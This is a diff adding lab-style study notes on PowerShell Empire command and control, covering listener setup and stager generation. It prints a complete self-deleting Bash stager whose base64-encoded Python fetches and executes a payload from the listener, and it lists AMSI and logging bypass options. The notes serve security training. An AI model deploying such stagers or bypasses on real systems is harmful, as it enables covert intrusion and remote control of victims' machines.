@@ -689,3 +689,192 @@ PowerShell Empire major sections
 * Agents - connections to comrpomised targets
 * Modules - used in conjunction with an agent to further exploit the target
 
+# Task 25 - Command and Control - Empire Listeners
+Listeners receive connections from stagers.  The default listener is HTTP.  A single listener can be used more than once.  In Empire you can use help [command] to get help on how to use the command
+
+* help
+```
+(Empire) > help
+
+Commands
+========
+agents            Jump to the Agents menu.
+creds             Add/display credentials to/from the database.
+exit              Exit Empire
+help              Displays the help menu.
+interact          Interact with a particular agent.
+...
+...
+...
+```
+* exploring uselistener in empire
+```
+(Empire) > uselistener 
+dbx             http_com        http_hop        http_mapi       onedrive        
+http            http_foreign    http_malleable  meterpreter     redirector    
+```
+```
+(Empire) > uselistener http
+(Empire: listeners/http) > info
+
+    Name: HTTP[S]
+Category: client_server
+
+Authors:
+  @harmj0y
+
+Description:
+  Starts a http[s] listener (PowerShell or Python) that uses a
+  GET/POST approach.
+...
+...
+...
+```
+```
+(Empire: listeners/http) > set Name webserver
+(Empire: listeners/http) > info
+
+    Name: HTTP[S]
+Category: client_server
+
+Authors:
+  @harmj0y
+
+Description:
+  Starts a http[s] listener (PowerShell or Python) that uses a
+  GET/POST approach.
+
+HTTP[S] Options:
+
+  Name              Required    Value                            Description
+  ----              --------    -------                          -----------
+  Name              True        webserver                        Name for the listener.
+...
+...
+...
+```
+```
+(Empire: listeners/http) > set Host 127.0.0.1
+(Empire: listeners/http) > set Port 3333
+(Empire: listeners/http) > info
+
+    Name: HTTP[S]
+Category: client_server
+
+Authors:
+  @harmj0y
+
+Description:
+  Starts a http[s] listener (PowerShell or Python) that uses a
+  GET/POST approach.
+
+HTTP[S] Options:
+
+  Name              Required    Value                            Description
+  ----              --------    -------                          -----------
+  Name              True        webserver                        Name for the listener.
+  Host              True        http://127.0.0.1:3333            Hostname/IP for staging.
+...
+...
+...
+```
+```
+(Empire: listeners/http) > execute
+[*] Starting listener 'webserver'
+ * Serving Flask app "http" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+[+] Listener successfully started!
+(Empire: listeners/http) > listeners
+
+[*] Active listeners:
+
+  Name              Module          Host                                 Delay/Jitter   KillDate
+  ----              ------          ----                                 ------------   --------
+  webserver         http            http://127.0.0.1:3333                5/0.0                      
+...
+...
+...
+```
+```
+(Empire) > listeners
+
+[*] Active listeners:
+
+  Name              Module          Host                                 Delay/Jitter   KillDate
+  ----              ------          ----                                 ------------   --------
+  webserver         http            http://127.0.0.1:3333                5/0.0                      
+
+(Empire: listeners) > kill 
+all        webserver  
+```
+* exploring listeners in starkiller
+```
+sudo powershell-empire --headless &
+```
+```
+starkiller
+
+run through the GUI creating a listener: create listener, fill in details, submit
+```
+
+# Task 26 - Empire Stagers
+Stagers are payloads in Empire and are used to connect back to waiting listeners, they create an agent when executed.  You can generate stagers in the Empire CLI or in Starkiller
+
+* exploring stagers in empire
+```
+(Empire) > usestager 
+multi/bash                osx/ducky                 osx/safari_launcher       windows/ducky             windows/macro
+multi/launcher            osx/dylib                 osx/shellcode             windows/hta               windows/macroless_msword
+multi/macro               osx/jar                   osx/teensy                windows/launcher_bat      windows/shellcode
+multi/pyinstaller         osx/launcher              windows/backdoorLnkMacro  windows/launcher_lnk      windows/teensy
+multi/war                 osx/macho                 windows/bunny             windows/launcher_sct      windows/wmic
+osx/applescript           osx/macro                 windows/csharp_exe        windows/launcher_vbs      
+osx/application           osx/pkg                   windows/dll               windows/launcher_xml      
+```
+```
+(Empire) > usestager multi/bash
+(Empire: stager/multi/bash) > info
+
+Name: BashScript
+
+Description:
+  Generates self-deleting Bash script to execute the
+  Empire stage0 launcher.
+
+Options:
+
+  Name             Required    Value             Description
+  ----             --------    -------           -----------
+  Listener         True                          Listener to generate stager for.
+  Language         True        python            Language of the stager to generate.
+  OutFile          False                         File to output Bash script to, otherwise
+                                                 displayed on the screen.
+  SafeChecks       True        True              Switch. Checks for LittleSnitch or a
+                                                 SandBox, exit the staging process if
+                                                 true. Defaults to True.
+  UserAgent        False       default           User-agent string to use for the staging
+                                                 request (default, none, or other).
+  ScriptLogBypass  False       True              Include cobbr's Script Block Log Bypass
+                                                 in the stager code.
+  AMSIBypass       False       True              Include mattifestation's AMSI Bypass in
+                                                 the stager code.
+  AMSIBypass2      False       False             Include Tal Liberman's AMSI Bypass in
+                                                 the stager code.
+```
+```
+(Empire: stager/multi/bash) > set Listener webserver
+(Empire: stager/multi/bash) > execute
+#!/bin/bash
+echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUpCm91dCwgZXJyID0gcHMuY29tbXVuaWNhdGUoKQppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliLnJlcXVlc3Q7ClVBPSdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbyc7c2VydmVyPSdodHRwOi8vMTI3LjAuMC4xOjMzMzMnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3Qoc2VydmVyK3QpOwpwcm94eSA9IHVybGxpYi5yZXF1ZXN0LlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliLnJlcXVlc3QuYnVpbGRfb3BlbmVyKHByb3h5KTsKby5hZGRoZWFkZXJzPVsoJ1VzZXItQWdlbnQnLFVBKSwgKCJDb29raWUiLCAic2Vzc2lvbj1QQkUraWlqcWpPSmtVbVpReXBqMGQwVEZ1bzA9IildOwp1cmxsaWIucmVxdWVzdC5pbnN0YWxsX29wZW5lcihvKTsKYT11cmxsaWIucmVxdWVzdC51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07ZGF0YT1hWzQ6XTtrZXk9SVYrJysoTT1KaTtIR1dkWXMhSTg6YjF+bG1VKmprLG56NlBPJy5lbmNvZGUoJ1VURi04Jyk7UyxqLG91dD1saXN0KHJhbmdlKDI1NikpLDAsW10KZm9yIGkgaW4gbGlzdChyYW5nZSgyNTYpKToKICAgIGo9KGorU1tpXStrZXlbaSVsZW4oa2V5KV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQppPWo9MApmb3IgY2hhciBpbiBkYXRhOgogICAgaT0oaSsxKSUyNTYKICAgIGo9KGorU1tpXSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCiAgICBvdXQuYXBwZW5kKGNocihjaGFyXlNbKFNbaV0rU1tqXSklMjU2XSkpCmV4ZWMoJycuam9pbihvdXQpKQ=='));" | python3 &
+rm -f "$0"
+exit
+```
+* exploring stagers in starkiller
+```
+in starkiller click on stagers > generate stager > fill in the options and point to your listener as created in the previous task
+```
+
+# Task 27 - Command and Control - Empire Agents
